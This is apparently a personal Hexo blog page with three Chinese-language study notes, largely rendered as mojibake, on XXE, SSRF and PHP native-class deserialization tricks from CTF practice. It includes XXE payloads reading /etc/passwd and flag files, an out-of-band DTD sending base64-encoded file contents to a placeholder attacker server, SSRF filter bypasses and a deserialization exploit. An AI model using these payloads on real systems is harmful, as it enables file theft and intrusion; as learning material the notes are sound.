<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-XXE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/12/XXE/" class="article-date">
  <time class="dt-published" datetime="2024-03-12T07:05:24.000Z" itemprop="datePublished">2024-03-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/12/XXE/">XXE</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>XML</strong></p>
<p>XMLå³ å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ï¼Œæ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå…¶æ ‡ç­¾æ²¡æœ‰é¢„å®šä¹‰ï¼Œéœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ï¼Œå…¶äºHTMLçš„åŒºåˆ«æ˜¯ï¼š</p>
<ul>
<li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</li>
<li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XMLå£°æ˜--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;          </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;                                                                          </span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>DTD</strong></p>
<p>ç”¨æ¥ä¸ºXMLæ–‡æ¡£å®šä¹‰è¯­ä¹‰çº¦æŸã€‚å¯ä»¥åµŒå…¥åœ¨XMLæ–‡æ¡£ä¸­(å†…éƒ¨å£°æ˜)ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹çš„æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­(å¤–éƒ¨å¼•ç”¨) </p>
<p>DTDä¸€èˆ¬è®¤ä¸ºæœ‰ä¸¤ç§å¼•ç”¨æˆ–å£°æ˜æ–¹å¼ï¼š</p>
<ul>
<li>1ã€å†…éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨XMLæ–‡æ¡£ä¸­ã€‚</li>
<li>2ã€å¤–éƒ¨DTDï¼šå³å¯¹XMLæ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„DTDçš„å£°æ˜éƒ½åœ¨ä¸€ä¸ªç‹¬ç«‹çš„DTDæ–‡ä»¶ï¼ˆ.dtdï¼‰ä¸­ã€‚ å¤–éƒ¨å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®</li>
</ul>
<p><strong>å¤–éƒ¨å®ä½“æ³¨å…¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ä»»æ„æ–‡ä»¶è¯»å–</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">æ— å›æ˜¾</span><br><span class="line">å…ˆä½¿ç”¨php://filterè·å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹ä»¥httpè¯·æ±‚å‘é€åˆ°æ¥å—æ•°æ®çš„æœåŠ¡å™¨(æ”»å‡»æœåŠ¡å™¨)xxx.xxx.xxxã€‚</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">    &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line">æ³¨æ„è§£ç </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://blog.szfszf.top/xml.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br><span class="line"></span><br><span class="line">xml.dtd</span><br><span class="line"></span><br><span class="line">&lt;!-- xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>ç»•è¿‡</strong></p>
<ol>
<li>systemç­‰è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ç¼–ç ç»•è¿‡</li>
<li>httpè¢«è¿‡æ»¤-&gt;ä½¿ç”¨ä¼ªåè®®+æ–‡ä»¶ä¸Šä¼ </li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/12/XXE/" data-id="clto5uld50000twb5cu721t2l" data-title="XXE" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/07/ssrf/" class="article-date">
  <time class="dt-published" datetime="2024-03-07T11:19:06.000Z" itemprop="datePublished">2024-03-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/07/ssrf/">ssrf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>æ˜ å°„</strong></p>
<p>ä¸»è¦ç”¨äºä½¿ä½äºå±€åŸŸç½‘ï¼ˆå†…ç½‘ï¼‰çš„è®¡ç®—æœºæˆ–æœåŠ¡å™¨å¯ä»¥é€šè¿‡å…¬ç½‘çš„åœ°å€è¿›è¡Œè®¿é—® </p>
<p><strong>SSRFæ¼æ´</strong></p>
<p>åœ¨å­¦ä¹ ssrfæ¼æ´ä¹‹å‰å¤§æŠµæ˜¯è§è¿‡ä¸€æ¬¡è¿™ç§é¢˜å‹çš„ï¼Œåœ¨NSSCTFä¸Šå«åšez_ssrfï¼Œä¸è¿‡æ„Ÿè§‰ä¸Šæ¥è¯´æ›´åƒæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåˆ†ä¸æ¸…æ¥šæƒ¹â€¦</p>
<p><strong>ä»€ä¹ˆæ˜¯SSRFæ¼æ´</strong></p>
<p>SSRF(Server-Side Request Forgery:<strong>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </strong>) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">å®‰å…¨æ¼æ´</a>ã€‚<strong>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</strong></p>
<hr>
<p><strong>SSRFæ¼æ´åŸç†</strong></p>
<p>SSRFçš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ç­‰ï¼Œåˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚SSRFåˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Web åº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p>
<hr>
<p>fileä¼ªåè®®ï¼šæ–‡ä»¶åŒ…å«æ¼æ´é‚£é‡Œè®°è¿‡ï¼Œå°±ä¸èµ˜è¿°äº†<br>dictä¼ªåè®®ï¼šå­—å…¸æœåŠ¡åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¯ç”¨äºæ‰«æç«¯å£<br>httpä¼ªåè®®ï¼šä»¥åªè¯»æ–¹å¼è®¿é—®èµ„æº</p>
<p>gophrä¼ªåè®®ï¼šåˆ©ç”¨èŒƒå›´è¾ƒå¹¿â€œget&#x2F;post&#x2F;redis&#x2F;fastcgi&#x2F;sqlâ€ï¼Œ*è¿™ä¸ªåè®®ä¼šåæ‰ç¬¬ä¸€ä¸ªå­—ç¬¦abcd-&gt;_abcdæ‰èƒ½å®Œæ•´æäº¤ã€‚</p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦ç”¨gophrä¼ªåè®®è€Œä¸ç”¨get&#x2F;postå‘¢ï¼Ÿå…¶åŸå› ä¸ºå¾ˆå¤šæ—¶å€™ä¸èƒ½ç›´æ¥getåˆ°å†…ç½‘åŒºåŸŸï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡æœ‰ssrfæ¼æ´çš„åœ°æ–¹ä½¿ç”¨è¯¥ä¼ªåè®®æäº¤æ•°æ®</p>
<p>ä½†æ˜¯ï¼Œä»¥getä¸¾ä¾‹ï¼Œå…¶å¿…é¡»è¦æœ‰ç‰¹å®šçš„å¤´éƒ¨ä¿¡æ¯ï¼Œæ¯”å¦‚è·¯å¾„å’Œç›®æ ‡ipåœ°å€ï¼Œä½¿ç”¨åè®®æ—¶éœ€è¦æ³¨æ„æ„é€ å¹¶ä¸”urlç¼–ç ä¸€æ¬¡ï¼Œæ³¨æ„ipåœ°å€åé¢éœ€è¦æœ‰ç«¯å£å·ï¼Œåœ¨HTTPåŒ…æœ€åè¦åŠ %0d%0aä»£è¡¨æ¶ˆæ¯ç»“æŸ</p>
<p>å¦‚æœä½¿ç”¨burpå‘åŒ…ï¼Œè¦urlç¼–ç ä¸¤æ¬¡ï¼ˆæµè§ˆå™¨ä¼šè‡ªå¸¦ä¸€æ¬¡ç¼–ç ï¼‰</p>
<hr>
<p>æ¥ä¸‹æ¥æ˜¯ä¸€äº›ç»•è¿‡æ–¹å¼</p>
<p><strong>ç¯å›åœ°å€ç»•è¿‡</strong></p>
<p>ç®€å•æ¥è¯´å°±æ˜¯å°†åœ°å€127.0.0.1è¿ç”¨è¿›åˆ¶è½¬æ¢é˜²æ­¢è¢«é™åˆ¶</p>
<p>æ¯”å¦‚å˜æˆ017700000001ï¼ˆç¬¬ä¸€ä¸ª0æŒ‡å…«è¿›åˆ¶ï¼‰</p>
<p><strong>é‡å®šå‘ç»•è¿‡</strong></p>
<p>urlæŒ‡å‘ä¸€ä¸ªå…¬ç½‘åœ°å€ï¼Œè¯¥åœ°å€é€šè¿‡302é‡å®šå‘çš„æ–¹å¼æŒ‡å‘å†…ç½‘ipï¼Œæ¥ç»•è¿‡æœåŠ¡å™¨å¯¹äºè®¿é—®åœ°å€æœ‰æ‰€é™åˆ¶çš„æƒ…å†µ</p>
<p><strong>DNSé‡ç»‘å®šç»•è¿‡</strong></p>
<p>ä¸ºäº†é¢„é˜²ä¸Šé¢çš„é‡å®šå‘ç»•è¿‡ï¼ŒæœåŠ¡å™¨ä¼šåœ¨æ¥æ”¶urlä¹‹åè·å–è¯¥urlå†…éƒ¨æŒ‡å‘çš„åœ°å€ï¼Œå¹¶å¯¹è¯¥åœ°å€è¿›è¡Œæ£€æŸ¥æ˜¯å¦ä¸ºå†…ç½‘ip</p>
<p>é’ˆå¯¹è¿™ç§é˜²å¾¡æ–¹å¼ï¼Œå…ˆä½¿ç›®æ ‡åœ°å€æŒ‡å‘ä¸€ä¸ªå…¬ç½‘ipï¼Œé€šè¿‡æ£€æŸ¥ï¼Œå†ä¿®æ”¹æŒ‡å‘åœ°å€ï¼Œåˆ©ç”¨æœåŠ¡å™¨ä¸¤æ¬¡è§£æåœ°å€çš„çŸ­æš‚é—´éš™ï¼Œæ›´æ¢ç›®æ ‡ipæ¥ç»•è¿‡ï¼Œä¸è¿‡è¿™ä¸ªæ–¹å¼ä¼šæœ‰ä¸€å®šæ¦‚ç‡ä¸ä¼šæˆåŠŸï¼Œéœ€è¦å¤šæ¬¡å°è¯•</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/07/ssrf/" data-id="clto5uldc000ctwb525y66kr8" data-title="ssrf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-åŸç”Ÿç±»" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="article-date">
  <time class="dt-published" datetime="2024-03-05T07:41:01.000Z" itemprop="datePublished">2024-03-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/05/%E5%8E%9F%E7%94%9F%E7%B1%BB/">åŸç”Ÿç±»</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>ä¸€å®šç¨‹åº¦ä¸ŠPHPçš„åŸç”Ÿç±»ç±»ä¼¼äºCè¯­è¨€ä¸­çš„åº“ ï¼Œæ˜¯ä¸€ç§é¢„å®šä¹‰è¿‡çš„å¯ä»¥ç®€åŒ–å¸¸è§ä»»åŠ¡çš„å¤„ç†è¿‡ç¨‹ã€‚ </p>
<p><strong>DirectoryIteratorç±»</strong></p>
<p><code>DirectoryIterator</code> ç±»æ˜¯ PHP çš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ‰©å±•è‡ª <code>SplFileInfo</code> ç±»å¹¶å®ç°äº† <code>SeekableIterator</code> æ¥å£ã€‚è¿™ä¸ªç±»æä¾›äº†ä¸€ä¸ªé«˜çº§æ¥å£æ¥éå†æ–‡ä»¶ç³»ç»Ÿç›®å½•ã€‚</p>
<p><strong>ä¸»è¦åŠŸèƒ½</strong></p>
<ul>
<li>éå†ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ã€‚</li>
<li>è·å–æ–‡ä»¶æˆ–ç›®å½•çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ä¿®æ”¹æ—¶é—´ã€æƒé™ã€å¤§å°ç­‰ã€‚</li>
<li>æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•çš„ç±»å‹å’ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å¦å¯è¯»ã€å¯å†™ï¼‰ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator extends SplFileInfo implements SeekableIterator &#123;</span><br><span class="line">	/* æ–¹æ³• */</span><br><span class="line">	public __construct ( string $path )</span><br><span class="line">	public current ( ) : DirectoryIterator</span><br><span class="line">	public getATime ( ) : int</span><br><span class="line">	public getBasename ( string $suffix = ? ) : string</span><br><span class="line">	public getCTime ( ) : int</span><br><span class="line">	public getExtension ( ) : string</span><br><span class="line">	public getFilename ( ) : string</span><br><span class="line">	public getGroup ( ) : int</span><br><span class="line">	public getInode ( ) : int</span><br><span class="line">	public getMTime ( ) : int</span><br><span class="line">	public getOwner ( ) : int</span><br><span class="line">	public getPath ( ) : string</span><br><span class="line">	public getPathname ( ) : string</span><br><span class="line">	public getPerms ( ) : int</span><br><span class="line">	public getSize ( ) : int</span><br><span class="line">	public getType ( ) : string</span><br><span class="line">	public isDir ( ) : bool</span><br><span class="line">	public isDot ( ) : bool</span><br><span class="line">	public isExecutable ( ) : bool</span><br><span class="line">	public isFile ( ) : bool</span><br><span class="line">	public isLink ( ) : bool</span><br><span class="line">	public isReadable ( ) : bool</span><br><span class="line">	public isWritable ( ) : bool</span><br><span class="line">	public key ( ) : string</span><br><span class="line">	public next ( ) : void</span><br><span class="line">	public rewind ( ) : void</span><br><span class="line">	public seek ( int $position ) : void</span><br><span class="line">	public __toString ( ) : string    // ä»¥å­—ç¬¦ä¸²å½¢å¼è·å–æ–‡ä»¶å</span><br><span class="line">	public valid ( ) : bool</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‡Œé¢å­˜åœ¨ ____constructå’Œ____toString  å¯ä»¥ååºåˆ—åŒ–åˆ©ç”¨  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">echo $a;</span><br><span class="line">echoä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å…¥ï¼Œä¼šè§¦å‘ `__toString()`ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å…¥æ ¹ç›®å½•çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new DirectoryIterator(&quot;glob://f*&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç»“åˆ<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>åè®®è¿›è¡Œå¤šç›®å½•éå† </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶ </p>
<h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h4><p>åŸºæœ¬å’ŒDirectoryIteratorä¸€æ ·</p>
<h4 id="GlobIterato"><a href="#GlobIterato" class="headerlink" title="GlobIterato"></a>GlobIterato</h4><p>åå­—å¯ä»¥çœ‹å‡ºè¿™ä¸ªç±»æ˜¯è‡ªå¸¦globåè®®çš„ï¼Œæ‰€ä»¥ä¸ç”¨å†ä½¿ç”¨globåè®®äº†ä¾‹å¦‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new GlobIterator(&quot;/&quot;);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h4><p>å½“ç”¨æ–‡ä»¶ç›®å½•éå†åˆ°äº†æ•æ„Ÿæ–‡ä»¶æ—¶ï¼Œå¯ä»¥ç”¨<code>SplFileObject</code>ç±»ï¼ŒåŒæ ·é€šè¿‡echoè§¦å‘<code>SplFileObject</code>ä¸­çš„<code>__toString()</code>æ–¹æ³•ã€‚(è¯¥ç±»ä¸æ”¯æŒé€šé…ç¬¦ï¼Œæ‰€ä»¥å¿…é¡»å…ˆè·å–åˆ°å®Œæ•´æ–‡ä»¶åç§°æ‰è¡Œ)ï¼Œè€Œä¸”è¿™ä¸ªæ–¹æ³•åªèƒ½è¯»ä¸€è¡Œ</p>
<hr>
<p><strong>ä¾‹é¢˜</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"> </span><br><span class="line">class a&#123;</span><br><span class="line"> </span><br><span class="line">    public $key;</span><br><span class="line">    public $value;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo new $this-&gt;key($this-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªååºåˆ—åŒ–æ²¡æœ‰ä»»ä½•å¯ä»¥ç›´æ¥åˆ©ç”¨çš„é­”æ³•å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªwakeupå¯ä»¥è¿›å…¥ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $value;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo new $this-&gt;key($this-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$a = new a();</span><br><span class="line">$a-&gt;key=&quot;SplFileObject&quot;;</span><br><span class="line">$a-&gt;value=&quot;./&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æ„é€ expå¾ˆç®€å•ï¼Œåªéœ€è¦è®©<strong>key</strong>å€¼èµ‹ä¸ºæˆ‘ä»¬æƒ³å¾—çš„åŸç”Ÿå‡½æ•°ï¼Œ<strong>value</strong>èµ‹ä¸ºè·¯å¾„ï¼ŒæŸ¥å°±å®Œäº†ä½†æ˜¯è¿™ä¸ªæ–¹æ³•çš„å±€é™æ€§å°±æ˜¯åªèƒ½æŸ¥ä¸€ä¸ªè·¯å¾„ä¸Šçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚ </p>
<hr>
